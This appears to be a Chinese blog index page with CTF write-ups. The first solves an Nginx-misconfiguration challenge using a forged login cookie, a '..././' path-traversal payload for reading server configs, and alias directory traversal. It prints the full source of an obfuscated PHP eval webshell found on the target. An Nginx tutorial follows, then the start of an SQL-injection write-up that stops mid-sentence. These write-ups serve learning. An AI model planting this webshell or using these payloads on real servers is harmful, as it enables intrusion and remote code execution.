<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>inanb</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="inanb"><meta name="msapplication-TileImage" content="img/favicon.ico"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="inanb"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="铁马冰河入梦来"><meta property="og:type" content="blog"><meta property="og:title" content="inanb"><meta property="og:url" content="https://removeif.github.io/"><meta property="og:site_name" content="inanb"><meta property="og:description" content="铁马冰河入梦来"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/avatar.png"><meta property="article:author" content="removeif"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/avatar.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com"},"headline":"inanb","image":["http://example.com/img/og_image.png"],"author":{"@type":"Person","name":"inanb"},"description":"铁马冰河入梦来"}</script><link rel="icon" href="/img/favicon.ico"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="inanb" type="application/atom+xml">
</head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/inanb.png" alt="inanb" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/music">音色</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Join Gitter" href="https://gitter.im/hexo-theme-amazing/community"><i class="fab fa-gitter"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-5-tablet is-9-desktop is-7-widescreen"><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-03-18  <a class="commentCountImg" href="/2021/03/18/Web-php-wrong-nginx-config/#comment-container"><span class="display-none-class">/2021/03/18/Web-php-wrong-nginx-config/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="0cfc30222cb0c87e85db0ccf7a4b6af3">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>7 分钟  <i class="fas fa-pencil-alt"> </i>1.0 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/18/Web-php-wrong-nginx-config/">Web_php_wrong_nginx_config</a></h1><div class="content"><h4><span id="web_php_wrong_nginx_config">Web_php_wrong_nginx_config</span></h4><p>进入题目是一个登录界面，拿御剑扫一下：</p>
<img src="/images/Web-php-wrong-nginx-config/image-20210318150302083.png" alt="image-20210318150302083" style="zoom:80%;">

<p>出来很多，但只有admin管用……</p>
<p>admin有一个please continue……手动发现robots.txt……愣是扫不出来</p>
<p>：hints.php Hack.php</p>
<p>hints告诉我们</p>
<p><img src="/images/Web-php-wrong-nginx-config/image-20210318150619914.png" alt="image-20210318150619914"></p>
<p>应该有一个文件读取的部分……</p>
<p>抓包，cookie里有一个isLogin=0，改成1进入了网站页面：</p>
<img src="/images/Web-php-wrong-nginx-config/image-20210318150825792.png" alt="image-20210318150825792" style="zoom:80%;">

<p>管理中心页面：<img src="/images/Web-php-wrong-nginx-config/image-20210318150858928.png" alt="image-20210318150858928" style="zoom:80%;"></p>
<p>这里应该可以读取配置文件……读不出来，原来是过滤了../  </p>
<p>双写：</p>
<p><code>?file=..././..././..././..././etc/nginx/sites-enabled/site.conf&amp;ext=</code></p>
<p>读取：</p>
<p><img src="/images/Web-php-wrong-nginx-config/image-20210318151131711.png" alt="image-20210318151131711"></p>
<p>按照提示说的，应该是Nginx的配置文件，用<strong>nginx-config-formatter-master</strong>整理代码：</p>
<blockquote>
<p>python nginxfmt.py [filename.conf]</p>
</blockquote>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">8080</span>;</span><br><span class="line">    <span class="comment">## listen for ipv4;</span></span><br><span class="line">    <span class="attribute">this</span> line is default and implied listen [::]:<span class="number">8080</span>;</span><br><span class="line">    <span class="comment">## listen for ipv6 root /var/www/html;</span></span><br><span class="line">    <span class="attribute">index</span> index.php index.html index.htm;</span><br><span class="line">    <span class="attribute">port_in_redirect</span> <span class="literal">off</span>;</span><br><span class="line">    <span class="attribute">server_name</span> _;</span><br><span class="line">    <span class="comment"># Make site accessible from http://localhost/ #server_name localhost;</span></span><br><span class="line">    <span class="comment"># If block for setting the time for the logfile if ($time_iso8601 ~ &quot;^(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)&quot;) &#123; set $year $1;</span></span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$month</span> <span class="variable">$2</span>;</span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$day</span> <span class="variable">$3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html sendfile off;</span></span><br><span class="line"><span class="attribute">set</span> <span class="variable">$http_x_forwarded_for_filt</span> <span class="variable">$http_x_forwarded_for</span>;</span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$http_x_forwarded_for_filt</span> <span class="regexp">~ ([0-9]+\.[0-9]+\.[0-9]+\.)[0-9]+)</span> &#123;</span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$http_x_forwarded_for_filt</span> <span class="variable">$1</span>???;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Add stdout logging access_log /var/log/nginx/$hostname-access-$year-$month-$day.log openshift_log;</span></span><br><span class="line"><span class="attribute">error_log</span> /var/log/nginx/error.log <span class="literal">info</span>;</span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">    <span class="comment"># First attempt to serve request as file, then # as directory, then fall back to index.html try_files $uri $uri/ /index.php?q=$uri&amp;$args;</span></span><br><span class="line">    <span class="attribute">server_tokens</span> <span class="literal">off</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#error_page 404 /404.html;</span></span><br><span class="line"><span class="comment"># redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html;</span></span><br><span class="line"><span class="attribute">location</span> = /50x.html &#123;</span><br><span class="line">    <span class="attribute">root</span> /usr/share/nginx/html;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.php?q=<span class="variable">$uri</span>&amp;<span class="variable">$args</span>;</span><br><span class="line">    <span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+\.php)(/.+)$</span>;</span><br><span class="line">    <span class="attribute">fastcgi_pass</span> unix:/var/run/php/php5.6-fpm.sock;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> SCRIPT_NAME <span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">    <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">    <span class="attribute">include</span> fastcgi_params;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> REMOTE_ADDR <span class="variable">$http_x_forwarded_for</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ /\.</span> &#123;</span><br><span class="line">    <span class="attribute">log_not_found</span> <span class="literal">off</span>;</span><br><span class="line">    <span class="attribute">deny</span> all;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> /web-img &#123;</span><br><span class="line">    <span class="attribute">alias</span> /images/;</span><br><span class="line">    <span class="attribute">autoindex</span> <span class="literal">on</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~* \.(ini|docx|pcapng|doc)$</span> &#123;</span><br><span class="line">    <span class="attribute">deny</span> all;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">include</span> /var/www/nginx[.]conf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>location这里就是处理路由，location明确不同的节点该如何处理：</p>
<blockquote>
<p>deny all 即拒绝访问。也可以allow指定IP访问</p>
<p><strong>root：</strong></p>
<p>location /i/ {</p>
<p>root /data/w3;      </p>
<p> }</p>
<p>root的处理结果是：root路径＋location路径</p>
<p>请求 <code>http://xxxx/i/top.gif </code>这个地址时，那么在服务器里面对应的真正的资源是<code> /data/w3/i/top.gif</code>文件</p>
<p><strong>alias：</strong></p>
<p>location /i/ {</p>
<p>alias /data/w3/;   </p>
<p>}</p>
<p>alias的处理结果是：使用alias路径替换location路径</p>
<p>同样请求 <code>http://foofish.net/i/top.gif</code> 时，在服务器查找的资源路径是：<code> /data/w3/top.gif</code>，因为alias会把location后面配置的路径丢弃掉，把当前匹配到的目录指向到指定的目录。</p>
</blockquote>
<p>尽管绝大部分配置都看不懂，但知道有一个/web-img的路径，转到根目录的/images中去……</p>
<p>而alias下的是： <strong>autoindex on;</strong></p>
<blockquote>
<p>Nginx默认是不允许列出整个目录的</p>
<p>如需此功能，打开nginx.conf文件，在location server 或 http段中加入<strong>autoindex on</strong>；</p>
<p>也就是访问这个网页可以实现网站目录遍历</p>
</blockquote>
<p>访问：<a target="_blank" rel="noopener" href="http://111.200.241.244:58533/web-img/">http://111.200.241.244:58533/web-img/</a></p>
<img src="/images/Web-php-wrong-nginx-config/image-20210318153058090.png" alt="image-20210318153058090" style="zoom:80%;">

<p>该目录下没有什么文件，访问/web-img../相当于/images/../，可以读到上层的目录</p>
<p><img src="/images/Web-php-wrong-nginx-config/image-20210318160059239.png" alt="image-20210318160059239"></p>
<p>发现hack.php.bak下载读取：</p>
<p><img src="/images/Web-php-wrong-nginx-config/image-20210318160147928.png" alt="image-20210318160147928"></p>
<p>php混淆……离谱</p>
<p>观察一下，关键是利用$f创建了一个函数，输出f并格式化：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$kh=<span class="string">&quot;42f7&quot;</span>;</span><br><span class="line">$kf=<span class="string">&quot;e9ac&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params">$t,$k</span>) </span>&#123;</span><br><span class="line">	$c=strlen($k);</span><br><span class="line">	$l=strlen($t);</span><br><span class="line">	$o=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;$l;) &#123;</span><br><span class="line">		<span class="keyword">for</span> ($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) &#123;</span><br><span class="line">			$o.=$t &#123;</span><br><span class="line">				$i</span><br><span class="line">			&#125;</span><br><span class="line">			^$k &#123;</span><br><span class="line">				$j</span><br><span class="line">			&#125;</span><br><span class="line">			;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line">$r=$_SERVER;</span><br><span class="line">$rr=@$r[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line">$ra=@$r[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>($rr&amp;&amp;$ra) &#123;</span><br><span class="line">	$u=parse_url($rr);</span><br><span class="line">	parse_str($u[<span class="string">&quot;query&quot;</span>],$q);</span><br><span class="line">	$q=array_values($q);</span><br><span class="line">	preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,$ra,$m);</span><br><span class="line">	<span class="keyword">if</span>($q&amp;&amp;$m) &#123;</span><br><span class="line">		@session_start();</span><br><span class="line">		$s=&amp;$_SESSION;</span><br><span class="line">		$ss=<span class="string">&quot;substr&quot;</span>;</span><br><span class="line">		$sl=<span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">		$i=$m[<span class="number">1</span>][<span class="number">0</span>].$m[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">		$h=$sl($ss(md5($i.$kh),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">		$f=$sl($ss(md5($i.$kf),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">		$p=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span> ($z=<span class="number">1</span>;$z&lt;count($m[<span class="number">1</span>]);$z++)$p.=$q[$m[<span class="number">2</span>][$z]];</span><br><span class="line">		<span class="keyword">if</span>(strpos($p,$h)===<span class="number">0</span>) &#123;</span><br><span class="line">			$s[$i]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">			$p=$ss($p,<span class="number">3</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(array_key_exists($i,$s)) &#123;</span><br><span class="line">			$s[$i].=$p;</span><br><span class="line">			$e=strpos($s[$i],$f);</span><br><span class="line">			<span class="keyword">if</span>($e) &#123;</span><br><span class="line">				$k=$kh.$kf;</span><br><span class="line">				ob_start();</span><br><span class="line">				@<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),$ss($s[$i],<span class="number">0</span>,$e))),$k)));</span><br><span class="line">				$o=ob_get_contents();</span><br><span class="line">				ob_end_clean();</span><br><span class="line">				$d=base64_encode(x(gzcompress($o),$k));</span><br><span class="line">				<span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">				@session_destroy();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>离谱，php混淆的代码，后面有个eval，大概是一个马……</p>
<p>我太菜了，看不动……</p>
<p>dalao：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44604541/article/details/107801811">https://blog.csdn.net/weixin_44604541/article/details/107801811</a></p>
<p>dalao竟然写了可交互的脚本……离谱：</p>
<p><img src="/images/Web-php-wrong-nginx-config/image-20210318160642217.png" alt="image-20210318160642217"></p>
<p>tql</p>
<blockquote>
<p>……wohaocai</p>
</blockquote>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-03-18  <a class="commentCountImg" href="/2021/03/18/Nginx%E5%85%A5%E9%97%A8/#comment-container"><span class="display-none-class">/2021/03/18/Nginx入门/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="abc4992e78dc2482ba0f04ec0f4a05ed">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>8 分钟  <i class="fas fa-pencil-alt"> </i>1.2 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/18/Nginx%E5%85%A5%E9%97%A8/">Nginx入门</a></h1><div class="content"><h5><span id="nginx">Nginx</span></h5><p><strong>1.简介</strong>：高性能的HTTP和反向代理服务器，占有内存少，并发能力强。</p>
<p>​    Nginx与Tomcat：Nginx可以作为静态页面的web服务器，支持CGI协议的动态语言，perl、php。    不支持Java，与apache构成竞争关系。Nginx更有优势。</p>
<p>​    Nginx功能丰富，可作为HTTP服务器，也可作为反向代理服务器，邮件服务器。支持FastCGI、SSL、Virtual Host、URL Rewrite、Gzip等功能。并且支持很多第三方的模块扩展。</p>
<p><strong>2.功能</strong>：</p>
<ul>
<li>​    正向代理：客户端通过代理服务器发送访问请求</li>
<li>​    反向代理：客户端访问Nginx代理的服务器，访问不到后台服务器</li>
<li>​    负载均衡：请求分发，根据路线，速度分配请求；提高抗风险能力。</li>
<li>​    动静分离：拿出静态资源，减小动态资源数据包，快速上线、修改；页面样式修改方便。</li>
</ul>
<p><strong>Nginx配置：</strong></p>
<blockquote>
<ul>
<li>1、<strong>全局块</strong>：配置影响nginx全局的指令。一般有运行nginx服务器的用户组，nginx进程pid存放路径，日志存放路径，配置文件引入，允许生成worker process数等。</li>
<li>2、<strong>events块</strong>：配置影响nginx服务器或与用户的网络连接。有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等。</li>
<li>3、<strong>http块</strong>：可以嵌套多个server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。如文件引入，mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等。</li>
<li>4、<strong>server块</strong>：配置虚拟主机的相关参数，一个http中可以有多个server。</li>
<li>5、<strong>location块</strong>：配置请求的路由，以及各种页面的处理情况。</li>
</ul>
</blockquote>
<p><img src="/images/Nginx%E5%85%A5%E9%97%A8/image-20210318133439418.png" alt="image-20210318133439418"></p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">########### 每个指令必须有分号结束。#################</span></span><br><span class="line"><span class="comment">#user administrator administrators;  #配置用户或者组，默认为nobody nobody。</span></span><br><span class="line"><span class="comment">#worker_processes 2;  #允许生成的进程数，默认为1</span></span><br><span class="line"><span class="comment">#pid /nginx/pid/nginx.pid;   #指定nginx进程运行文件存放地址</span></span><br><span class="line"><span class="attribute">error_log</span> log/error.log <span class="literal">debug</span>;  <span class="comment">#制定日志路径，级别。这个设置可以放入全局块，http块，server块，级别以此为：debug|info|notice|warn|error|crit|alert|emerg</span></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">accept_mutex</span> <span class="literal">on</span>;   <span class="comment">#设置网路连接序列化，防止惊群现象发生，默认为on</span></span><br><span class="line">    <span class="attribute">multi_accept</span> <span class="literal">on</span>;  <span class="comment">#设置一个进程是否同时接受多个网络连接，默认为off</span></span><br><span class="line">    <span class="comment">#use epoll;      #事件驱动模型，select|poll|kqueue|epoll|resig|/dev/poll|eventport</span></span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">1024</span>;    <span class="comment">#最大连接数，默认为512</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span>       mime.types;   <span class="comment">#文件扩展名与文件类型映射表</span></span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream; <span class="comment">#默认文件类型，默认为text/plain</span></span><br><span class="line">    <span class="comment">#access_log off; #取消服务日志    </span></span><br><span class="line">    <span class="attribute">log_format</span> myFormat <span class="string">&#x27;<span class="variable">$remote_addr</span>–<span class="variable">$remote_user</span> [<span class="variable">$time_local</span>] <span class="variable">$request</span> <span class="variable">$status</span> <span class="variable">$body_bytes_sent</span> <span class="variable">$http_referer</span> <span class="variable">$http_user_agent</span> <span class="variable">$http_x_forwarded_for</span>&#x27;</span>; <span class="comment">#自定义格式</span></span><br><span class="line">    <span class="attribute">access_log</span> log/access.log myFormat;  <span class="comment">#combined为日志格式的默认值</span></span><br><span class="line">    <span class="attribute">sendfile</span> <span class="literal">on</span>;   <span class="comment">#允许sendfile方式传输文件，默认为off，可以在http块，server块，location块。</span></span><br><span class="line">    <span class="attribute">sendfile_max_chunk</span> <span class="number">100k</span>;  <span class="comment">#每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。</span></span><br><span class="line">    <span class="attribute">keepalive_timeout</span> <span class="number">65</span>;  <span class="comment">#连接超时时间，默认为75s，可以在http，server，location块。</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">upstream</span> mysvr &#123;   </span><br><span class="line">      <span class="attribute">server</span> <span class="number">127.0.0.1:7878</span>;</span><br><span class="line">      <span class="attribute">server</span> <span class="number">192.168.10.121:3333</span> backup;  <span class="comment">#热备</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">error_page</span> <span class="number">404</span> https://www.baidu.com; <span class="comment">#错误页</span></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">keepalive_requests</span> <span class="number">120</span>; <span class="comment">#单连接请求上限次数。</span></span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">4545</span>;   <span class="comment">#监听端口</span></span><br><span class="line">        <span class="attribute">server_name</span>  <span class="number">127.0.0.1</span>;   <span class="comment">#监听地址       </span></span><br><span class="line">        <span class="attribute">location</span>  ~*^.+$ &#123;       <span class="comment">#请求的url过滤，正则匹配，~为区分大小写，~*为不区分大小写。</span></span><br><span class="line">           <span class="comment">#root path;  #根目录</span></span><br><span class="line">           <span class="comment">#index vv.txt;  #设置默认页</span></span><br><span class="line">           <span class="attribute">proxy_pass</span>  http://mysvr;  <span class="comment">#请求转向mysvr 定义的服务器列表</span></span><br><span class="line">           <span class="attribute">deny</span> <span class="number">127.0.0.1</span>;  <span class="comment">#拒绝的ip</span></span><br><span class="line">           <span class="attribute">allow</span> <span class="number">172.18.5.54</span>; <span class="comment">#允许的ip           </span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>   几个常见配置项：</p>
<ul>
<li>1.$remote_addr 与 $http_x_forwarded_for 用以记录客户端的ip地址；</li>
<li>2.$remote_user ：用来记录客户端用户名称；</li>
<li>3.$time_local ： 用来记录访问时间与时区；</li>
<li>4.$request ： 用来记录请求的url与http协议；</li>
<li>5.$status ： 用来记录请求状态；成功是200；</li>
<li>6.$body_bytes_s ent ：记录发送给客户端文件主体内容大小；</li>
<li>7.$http_referer ：用来记录从那个页面链接访问过来的；</li>
<li>8.$http_user_agent ：记录客户端浏览器的相关信息；</li>
</ul>
</blockquote>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-03-17  <a class="commentCountImg" href="/2021/03/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-unfinish/#comment-container"><span class="display-none-class">/2021/03/17/网鼎杯-2018-unfinish/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="8b7879f3af83b6e175ef0ee0e41fe649">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>4 分钟  <i class="fas fa-pencil-alt"> </i>0.6 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-unfinish/">网鼎杯-2018-unfinish</a></h1><div class="content"><h5><span id="网鼎杯-2018-unfinish">网鼎杯-2018-unfinish</span></h5><h6><span id="1题目">1.题目：</span></h6><h6><span id="2过程">2.过程：</span></h6><p>进入题目，是一个/login.php，放到御剑扫：</p>
<img src="/images/网鼎杯-2018-unfinish/image-20210317133844360.png" alt="image-20210317133844360" style="zoom:70%;">

<p>有注册界面，随便注册一个看看：</p>
<img src="/images/网鼎杯-2018-unfinish/image-20210317134024989.png" alt="image-20210317134024989" style="zoom:80%;">

<p>什么都没有……左边有一个侧边栏可以看到注册的用户名</p>
<p>各种方法都试了一下，都没有成功……在注册时发现用户名（username）加单引号时，界面回显不同，应该是插入数据库时’导致语句的格式错误……（应该先搞懂sql插入语句的……）</p>
<blockquote>
<p><strong>SQL INSERT INTO 语句</strong>：</p>
<p>INSERT INTO 表名称 VALUES (值1, 值2,….)</p>
<img src="/images/网鼎杯-2018-unfinish/image-20210317140715985.png" alt="image-20210317140715985" style="zoom:60%;">
</blockquote>
<p>题目中的sql插入语句就有可能是：</p>
